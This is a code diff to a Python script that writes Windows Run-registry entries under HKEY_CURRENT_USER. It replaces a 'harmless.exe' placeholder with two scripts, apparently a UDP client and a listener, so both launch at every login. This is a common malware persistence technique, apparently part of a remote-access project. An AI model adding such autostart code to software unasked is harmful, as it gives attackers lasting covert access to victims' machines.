@@ -14,11 +14,13 @@ def AddToRegistry():
     pth = os.path.dirname(os.path.realpath(__file__))
       
     # name of the python file with extension 
-    s_name="harmless.exe"     
+    s_name="/UDP_Connection/client.py"
+    s_name2= "/UDP_Connection/clientlistener.py"     
       
     # joins the file name to end of path address 
     address=os.path.join(pth,s_name)  
-      
+    address2 = os.path.join(pth, s_name2)
+
     # key we want to change is HKEY_CURRENT_USER  
     # key value is Software\Microsoft\Windows\CurrentVersion\Run 
     key = reg.HKEY_CURRENT_USER
@@ -28,11 +30,18 @@ def AddToRegistry():
     open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) 
       
     # modifiy the opened key 
-    reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address) 
+    reg.SetValueEx(open,"client",0,reg.REG_SZ,address) 
       
     # now close the opened key 
     reg.CloseKey(open) 
   
+    open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) 
+      
+    # modifiy the opened key 
+    reg.SetValueEx(open,"clientlistener",0,reg.REG_SZ,address2) 
+      
+    # now close the opened key 
+    reg.CloseKey(open) 
 # Driver Code 
 if __name__=="__main__": 
     AddToRegistry() 
